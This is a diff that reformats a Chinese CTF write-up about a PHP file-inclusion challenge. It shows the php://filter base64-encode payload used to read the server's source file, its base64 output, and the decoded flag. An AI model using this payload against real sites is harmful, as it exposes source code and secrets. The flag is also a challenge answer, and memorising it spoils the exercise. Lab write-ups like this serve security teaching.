@@ -127,20 +127,28 @@ php://filter是一种元封装器，设计用于数据流打开时的筛选过�
 **2.** 然后开始构造payload，分析页面发现，`http://vps1.blue-whale.me:23338/?page=flag` ,这里是靠page参数进行跳转页面，
 于是构造payload : `?page=php://filter/read/resource=./flag `  ,此段代码的含义可理解为筛选`page=flag`的页面并读取。但是页面并没有反应，于是我猜想可能是因为过滤了`read`这个关键词（一般会对一些伪协议的关键词进行过滤，如`read`、`resource`等等）。
 
-**3.** 试一下将read这个关键词进行BASE64加密，新的payload：`?page=php://filter/read=convert.base64-encode/resource=./flag`
+**3.** 试一下将read这个关键词进行BASE64加密，新的payload：
+
+`?page=php://filter/read=convert.base64-encode/resource=./flag`
 
 **4.** 得到一组BASE64加密的字符串
-`aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=`
 
-**5.**进行解密，得到flag！
-`
-ha ha? you want flag? flag is here<?php
+`aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdX
+JjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9J
+zsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=`
+
+**5.** 进行解密，得到flag！
+``` php
+ha ha? you want flag? flag is here
+<?php
 // try to read this source code
 //$flag = 'flag{really_basic_skill_web_dog_should_know}';
-?>, but don't let you see! `
+?>, but don't let you see!   
+
+```
 
 
-**lag{really_basic_skill_web_dog_should_know}**
+**flag{really_basic_skill_web_dog_should_know}**
 
 
 
